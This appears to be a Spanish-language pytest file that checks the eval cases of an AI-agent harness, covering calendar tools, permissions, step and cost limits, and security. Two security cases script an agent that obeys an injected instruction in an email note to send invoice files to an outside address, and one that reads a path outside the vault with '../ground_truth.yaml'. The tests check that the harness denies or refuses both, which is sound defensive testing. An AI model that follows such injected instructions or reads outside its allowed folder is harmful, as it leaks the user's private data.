"""Pruebas de los 10 casos de eval que vienen con el repositorio (packages/evals/cases/*.yaml, tarea T8).

Comprueban que los archivos cargan, que los ids son exactamente los acordados y que cada caso conserva lo
fijado por el orquestador (guion, límites, criterios). Que los casos PASEN al ejecutarlos se prueba en test_evals_cli.py.
"""
from pathlib import Path

import pytest

from gabinete_evals.cases import Limites, load_cases
from gabinete_harness.providers.scripted import ScriptedProvider

CASES_DIR = Path(__file__).resolve().parents[1] / "packages" / "evals" / "cases"

IDS_POR_ARCHIVO = {
    "herramientas.yaml": [
        "herramienta-eventos-hoy",
        "herramienta-dia-sin-eventos",
        "herramienta-leer-nota",
        "herramienta-argumentos-invalidos",
        "herramienta-desconocida",
    ],
    "permisos.yaml": ["permisos-envio-denegado"],
    "limites.yaml": ["limites-max-pasos", "limites-max-costo"],
    "seguridad.yaml": ["seguridad-inyeccion-correo", "seguridad-ruta-fuera-del-vault"],
}
CAPA_POR_ARCHIVO = {
    "herramientas.yaml": "herramientas",
    "permisos.yaml": "permisos",
    "limites.yaml": "limites",
    "seguridad.yaml": "seguridad",
}
TODOS_LOS_IDS = [i for ids in IDS_POR_ARCHIVO.values() for i in ids]


@pytest.fixture(scope="module")
def casos() -> dict:
    """id -> Case, cargando la carpeta completa."""
    return {c.id: c for c in load_cases(CASES_DIR)}


def test_la_carpeta_tiene_exactamente_los_cuatro_archivos():
    assert sorted(p.name for p in CASES_DIR.glob("*.yaml")) == sorted(IDS_POR_ARCHIVO)


def test_los_diez_ids_exactos_y_unicos():
    ids = [c.id for c in load_cases(CASES_DIR)]
    assert len(ids) == 10 and len(set(ids)) == 10
    assert sorted(ids) == sorted(TODOS_LOS_IDS)


@pytest.mark.parametrize("archivo", sorted(IDS_POR_ARCHIVO))
def test_cada_archivo_carga_solo_y_con_sus_ids_y_su_capa(archivo):
    cargados = load_cases(CASES_DIR / archivo)
    assert [c.id for c in cargados] == IDS_POR_ARCHIVO[archivo]
    assert {c.capa for c in cargados} == {CAPA_POR_ARCHIVO[archivo]}


def test_todos_tienen_guion_y_el_guion_es_valido_para_el_proveedor_falso(casos):
    for caso in casos.values():
        assert caso.guion, f"{caso.id}: sin guion"
        ScriptedProvider(caso.guion)  # lanza ValueError si el guion está mal escrito


def test_todos_tienen_criterios_y_pregunta(casos):
    for caso in casos.values():
        assert caso.pregunta.strip() and caso.esperado.has_criteria(), caso.id
        assert caso.repeticiones == 1


@pytest.mark.parametrize("archivo", sorted(IDS_POR_ARCHIVO))
def test_cada_archivo_avisa_al_inicio_que_mide_el_harness_y_no_al_modelo(archivo):
    lineas = (CASES_DIR / archivo).read_text(encoding="utf-8").splitlines()
    assert lineas[0].startswith("#"), "el archivo debe empezar con un comentario"
    cabecera = []
    for linea in lineas:
        if not linea.startswith("#"):
            break
        cabecera.append(linea)
    texto = " ".join(cabecera)
    assert "ScriptedProvider" in texto and "HARNESS" in texto
    assert " NO " in texto  # la aclaración "... NO al modelo" va en mayúsculas


# --- lo fijado por el orquestador, caso por caso ---------------------------------------------------------


def llamadas_de(paso: dict) -> list[tuple[str, dict]]:
    return [(c["name"], c["arguments"]) for c in paso.get("tool_calls", [])]


def llamadas(caso) -> list[tuple[str, dict]]:
    """Las llamadas a herramienta del guion, en orden: (nombre, argumentos)."""
    return [llamada for paso in caso.guion for llamada in llamadas_de(paso)]


def textos(caso) -> list[str]:
    return [paso["text"] for paso in caso.guion if "text" in paso]


def test_eventos_hoy(casos):
    c = casos["herramienta-eventos-hoy"]
    assert llamadas(c) == [("calendar.list_events", {"date": "2026-11-05"})]
    assert textos(c) == ["Hoy tienes la cita con el dentista a las 11:30 y la reunión con Rosa Huamán a las 15:00."]
    e = c.esperado
    assert (e.contiene, e.herramienta, e.max_pasos, e.stop_reason) == (["dentista", "Rosa"], "calendar.list_events", 3, "answer")


def test_dia_sin_eventos(casos):
    c = casos["herramienta-dia-sin-eventos"]
    assert llamadas(c) == [("calendar.list_events", {"date": "2026-11-07"})]
    assert textos(c) == ["No tienes eventos ese día."]
    e = c.esperado
    assert (e.contiene, e.herramienta, e.stop_reason) == (["no tienes eventos"], "calendar.list_events", "answer")


def test_leer_nota(casos, repo_root):
    c = casos["herramienta-leer-nota"]
    assert llamadas(c) == [("notes.read", {"path": "perfil.md"})]
    assert textos(c) == ["Valeria vive en Lima desde septiembre de 2026."]
    assert (c.esperado.contiene, c.esperado.herramienta) == (["Lima"], "notes.read")
    assert (repo_root / "fixtures" / "vault" / "perfil.md").is_file()


def test_argumentos_invalidos(casos):
    c = casos["herramienta-argumentos-invalidos"]
    assert llamadas(c) == [
        ("calendar.list_events", {"date": "mañana"}),
        ("calendar.list_events", {"date": "2026-11-05"}),
    ]
    assert len(textos(c)) == 1 and c.guion[-1].get("text")
    e = c.esperado
    assert (e.herramienta, e.max_pasos, e.stop_reason) == ("calendar.list_events", 3, "answer")


def test_herramienta_desconocida(casos):
    c = casos["herramienta-desconocida"]
    assert [n for n, _ in llamadas(c)] == ["calendar.delete_all"]
    assert textos(c) == ["No tengo esa herramienta."]
    assert (c.esperado.stop_reason, c.esperado.contiene) == ("answer", ["no tengo"])


def test_envio_denegado(casos):
    c = casos["permisos-envio-denegado"]
    assert llamadas(c) == [
        ("email.send", {"to": "cliente@ejemplo.invalid", "subject": "Hola", "body": "Mensaje de prueba"})
    ]
    e = c.esperado
    assert (e.stop_reason, e.herramienta, e.max_pasos) == ("denied", "email.send", 1)


def test_limite_de_pasos(casos):
    c = casos["limites-max-pasos"]
    assert len(c.guion) == 10
    assert all(paso == {"tool_calls": [{"name": "calendar.list_events", "arguments": {"date": "2026-11-05"}}]} for paso in c.guion)
    assert c.limites == Limites(max_steps=3, max_cost_usd=None)
    assert (c.esperado.stop_reason, c.esperado.max_pasos) == ("max_steps", 3)


def test_limite_de_costo(casos):
    c = casos["limites-max-costo"]
    assert len(c.guion) == 3
    for paso in c.guion:
        assert [n for n, _ in llamadas_de(paso)] == ["calendar.list_events"]
        assert paso["usage"] == {"cost_usd": 0.6}
    assert c.limites == Limites(max_steps=None, max_cost_usd=1.0)
    assert (c.esperado.stop_reason, c.esperado.max_pasos) == ("max_cost", 2)


def test_inyeccion_en_el_correo(casos, repo_root):
    c = casos["seguridad-inyeccion-correo"]
    leer, enviar = llamadas(c)
    assert leer == ("notes.read", {"path": "inbox/correo-reenviado-hosting.md"})
    assert enviar == (
        "email.send",
        {"to": "pagos@ejemplo.invalid", "subject": "Facturas", "body": "contenido de finanzas/facturas.md"},
    )
    assert (c.esperado.stop_reason, c.esperado.herramienta) == ("denied", "email.send")
    nota = (repo_root / "fixtures" / "vault" / "inbox" / "correo-reenviado-hosting.md").read_text(encoding="utf-8")
    assert "pagos@ejemplo.invalid" in nota and "finanzas/facturas.md" in nota  # la instrucción inyectada sigue en la fixture


def test_ruta_fuera_del_vault(casos, repo_root):
    c = casos["seguridad-ruta-fuera-del-vault"]
    assert llamadas(c) == [("notes.read", {"path": "../ground_truth.yaml"})]
    assert textos(c) == ["No puedo leer esa ruta."]
    e = c.esperado
    assert (e.stop_reason, e.contiene, e.no_contiene) == ("answer", ["no puedo"], ["rag-ciudad"])
    # el criterio solo tiene sentido si ese texto SÍ está en el archivo que se intenta leer
    assert "rag-ciudad" in (repo_root / "fixtures" / "ground_truth.yaml").read_text(encoding="utf-8")
